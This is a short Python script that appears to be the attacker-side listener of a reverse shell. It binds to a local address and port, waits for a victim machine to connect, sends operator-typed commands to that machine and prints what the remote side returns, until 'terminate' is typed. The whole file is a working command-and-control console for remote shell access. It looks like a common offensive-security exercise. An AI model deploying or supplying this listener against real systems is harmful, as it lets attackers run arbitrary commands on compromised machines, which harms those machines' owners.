#!/usr/bin/env python2.7
import socket


def connect():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind(("10.0.0.10", 8080))
    server.listen(1)
    conn, addr = server.accept()
    print("[+] We got a connection from :", addr)

    while True:
        command = input("Shell> ")
        if 'terminate' in command:
            conn.sendall('terminate'.encode('utf-8'))
            conn.close()
            break
        else:
            conn.sendall(command.encode('utf-8'))
            data = conn.recv(1024)
            print(data.decode('utf-8'))


def main():
    connect()


main()
